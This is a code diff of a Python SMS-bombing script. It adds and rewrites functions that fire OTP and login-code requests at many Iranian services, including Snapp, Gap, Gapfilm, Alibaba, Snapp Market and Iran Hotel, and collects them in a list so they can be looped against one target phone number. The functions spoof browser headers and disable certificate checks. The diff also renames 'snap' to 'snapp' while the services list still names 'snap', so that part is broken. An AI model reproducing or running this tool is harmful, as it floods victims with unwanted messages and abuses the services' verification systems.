@@ -1946,15 +1946,43 @@ def alopeyk_safir(phone):
         print(f'{r}[!] Alopeyk Safir Exception: {e}{a}')
         return False
 
-def snap(phone):
-    snapH = {"Host": "app.snapp.taxi", "content-type": "application/json"}
-    snapD = {"cellphone": phone}
+def snapp(phone):
     try:
-        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
-        return "OK" in snapR
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "cellphone": f"+98{formatted_phone}"
+        }
+        
+        response = requests.post(
+            "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] snapp Status: {response.status_code}{a}')
+        print(f'{y}[Debug] snapp Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(snapp) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] snapp error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
-        print(f"{r}[!] Snap Exception: {e}")
+        print(f'{r}[!] snapp exception: {e}{a}')
         return False
+
+
 def shahrfarsh(phone):
     url = "https://shahrfarsh.com/Account/Login"
     payload = {"phoneNumber": "0" + phone.split("+98")[1]}
@@ -2011,11 +2039,105 @@ def drnext(phone):
 
 def gap(phone):
     try:
-        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1])).text
-        return "OK" in gapR
+        # استخراج شماره بدون +
+        formatted_phone = phone.split("+")[1] if "+" in phone else phone.replace("+98", "").replace("+", "")
+        
+        headers = {
+            "Host": "core.gap.im",
+            "accept": "application/json, text/plain, */*",
+            "x-version": "4.5.7", 
+            "accept-language": "fa",
+            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
+            "appversion": "web",
+            "origin": "https://web.gap.im",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://web.gap.im/",
+            "accept-encoding": "gzip, deflate, br"
+        }
+        
+        response = requests.get(
+            f"https://core.gap.im/v1/user/add.json?mobile=%2B{formatted_phone}",
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[gap] Status: {response.status_code}{a}')
+        print(f'{y}[gap] Response: {response.text}{a}')
+        
+        if response.status_code == 200 and "OK" in response.text:
+            print(f'{g}(gap) Code sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] gap error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
-        print(f"{r}[!] Gap Exception: {e}")
+        print(f'{r}[!] gap exception: {e}{a}')
         return False
+
+
+def gapfilm(phone):
+    try:
+        # استخراج شماره بدون +98
+        formatted_phone = phone.split("+98")[1] if "+98" in phone else phone.replace("+98", "").replace("+", "")
+        
+        headers = {
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'fa',
+            'Browser': 'Opera',
+            'BrowserVersion': '82.0.4227.33',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/json',
+            'Host': 'core.gapfilm.ir',
+            'IP': '185.156.172.170',
+            'Origin': 'https://www.gapfilm.ir',
+            'OS': 'Linux',
+            'Referer': 'https://www.gapfilm.ir/',
+            'SourceChannel': 'GF_WebSite',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'
+        }
+        
+        payload = {
+            "Type": 3,
+            "Username": formatted_phone,
+            "SourceChannel": "GF_WebSite",
+            "SourcePlatform": "desktop",
+            "SourcePlatformAgentType": "Opera",
+            "SourcePlatformVersion": "82.0.4227.33",
+            "GiftCode": None
+        }
+        
+        response = requests.post(
+            'https://core.gapfilm.ir/api/v3.1/Account/Login',
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[gapfilm] Status: {response.status_code}{a}')
+        print(f'{y}[gapfilm] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('Code') == 1:
+                print(f'{g}(gapfilm) Code sent successfully! ✅{a}')
+                return True
+            else:
+                print(f'{r}[-] gapfilm failed: {data.get("Message", "Unknown error")}{a}')
+                return False
+        else:
+            print(f'{r}[-] gapfilm error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] gapfilm exception: {e}{a}')
+        return False
+
 
 def divar(phone):
     divarD = {"phone": phone.split("+98")[1]}
@@ -2027,13 +2149,54 @@ def divar(phone):
         return False
 
 def alibaba(phone):
-    alibabaD = {"phoneNumber": "0"+phone.split("+98")[1]}
     try:
-        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', json=alibabaD ).json()
-        return alibabaR.get("result", {}).get("success")
+        # استفاده از فرمت 0912... (با صفر)
+        formatted_phone = "0" + phone.split("+98")[1] if "+98" in phone else "0" + phone.replace("+98", "")
+        
+        headers = {
+            "Host": "ws.alibaba.ir",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR",
+            "ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy",
+            "Content-Type": "application/json;charset=utf-8",
+            "Content-Length": "29",
+            "Origin": "https://www.alibaba.ir",
+            "Connection": "keep-alive",
+            "Referer": "https://www.alibaba.ir/hotel"
+        }
+        
+        payload = {"phoneNumber": formatted_phone}
+        
+        response = requests.post(
+            'https://ws.alibaba.ir/api/v3/account/mobile/otp',
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[alibaba] Status: {response.status_code}{a}')
+        print(f'{y}[alibaba] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("result", {}).get("success") == True:
+                print(f'{g}(alibaba) Code sent successfully! ✅{a}')
+                return True
+            else:
+                print(f'{r}[-] alibaba failed: {data.get("message", "Unknown error")}{a}')
+                return False
+        else:
+            print(f'{r}[-] alibaba error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
-        print(f"{r}[!] AliBaba Exception: {e}")
+        print(f'{r}[!] alibaba exception: {e}{a}')
         return False
+        
 
 def mek(phone):
     try:
@@ -2090,18 +2253,46 @@ def okorosh(phone):
         print(f"{r}[!] OfoghKourosh Exception: {e}")
         return False
 
-def snapp_market(phone):
-    url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass"
-    params = {"cellphone": "0" + phone.split("+98")[1]}
+def smarket(phone):
     try:
-        response = post(url, params=params, timeout=5)
+        # استخراج شماره بدون +98 و اضافه کردن 0
+        formatted_phone = "0" + phone.split("+98")[1] if "+98" in phone else "0" + phone.replace("+98", "")
+        
+        headers = {
+            'accept': '*/*',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'text/plain;charset=UTF-8',
+            'origin': 'https://snapp.market',
+            'referer': 'https://snapp.market/',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'
+        }
+        
+        # استفاده از GET به جای POST (همانطور که در URL مشخصه)
+        response = requests.get(
+            f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={formatted_phone}',
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[smarket] Status: {response.status_code}{a}')
+        print(f'{y}[smarket] Response: {response.text}{a}')
+        
         if response.status_code == 200:
-            print(f'{g}(Snapp Market) {a}Code Sent')
-            return True
+            data = response.json()
+            if data.get('status') == True:
+                print(f'{g}(SnapMarket) Code sent successfully! ✅{a}')
+                return True
+            else:
+                print(f'{r}[-] smarket failed: {data.get("message", "Unknown error")}{a}')
+                return False
         else:
-            print(f'{r}[-] (Snapp Market) Failed or No Response{a}')
+            print(f'{r}[-] smarket error: {response.status_code}{a}')
+            return False
+            
     except Exception as e:
-        print(f'{r}[!] Snapp Market Exception: {e}{a}')
+        print(f'{r}[!] smarket exception: {e}{a}')
         return False
 
 def digikala(phone):
@@ -2547,6 +2738,49 @@ def banimode(phone):
         return False
         
 
+def iranhotel(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "api-supported-versions": "1.0",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Origin": "https://www.iranhotelonline.com",
+            "Referer": "https://www.iranhotelonline.com/"
+        }
+        
+        payload = {
+            "Email": "",
+            "Mobile": formatted_phone,
+            "ActivationWay": 1,
+            "Token": ""
+        }
+        
+        response = requests.post(
+            "https://www.iranhotelonline.com/api/mvc/Account/SendActivationCode",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[iranhotel] Status: {response.status_code}{a}')
+        print(f'{y}[iranhotel] Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(iranhotel) Activation code sent! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] iranhotel error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] iranhotel exception: {e}{a}')
+        return False
+
 
         
 # ==========================
@@ -2554,15 +2788,13 @@ def banimode(phone):
 # ==========================
 
 services = [
-    achareh, alibaba, alldigitall, alopeyk_safir, angeliran, Balad, banimode, barghman,
-    Besparto, bimebazar, bodoroj, candom_shop, Charsooq, dgshahr, digikala, DigikalaJet,
-    divar, drnext, drto, elanza, gap, ghasedak24, hajamooo, harikashop,
-    ilozi, katonikhan, katoonistore, komodaa, Koohshid, mahabadperfume, malltina, mek,
-    missomister, mo7_ir, mobilex, mootanroo, mrbilit, niktakala, Okala, otaghak,
-    okorosh, paklean_call, payonshoes, pinket, pindo, ragham_call, riiha, Sandalestan,
-    shahrfarsh, ShahreSandal, snap, snapp_market, snappshop, sibapp, sibbank, tapsi,
-    tapsi_food, tetherland, theshoes, torobpay, trip, trip_call, tebinja, virgool,
-    vitrin_shop, dastakht, masterkala
+    achareh, alibaba, alldigitall, alopeyk_safir, angeliran, Balad, banimode, barghman, Besparto, bimebazar,
+    bodoroj, candom_shop, Charsooq, dastakht, dgshahr, digikala, DigikalaJet, divar, drnext, drto,
+    elanza, gap, gapfilm, ghasedak24, hajamooo, harikashop, ilozi, iranhotel, katonikhan, katoonistore,
+    komodaa, Koohshid, mahabadperfume, malltina, masterkala, mek, missomister, mo7_ir, mobilex, mootanroo,
+    mrbilit, niktakala, Okala, okorosh, otaghak, paklean_call, payonshoes, pindo, pinket, ragham_call,
+    riiha, Sandalestan, ShahreSandal, shahrfarsh, sibapp, sibbank, smarket, snap, snappshop, tapsi,
+    tapsi_food, tebinja, tetherland, theshoes, torobpay, trip, trip_call, virgool, vitrin_shop
 ]
 
 
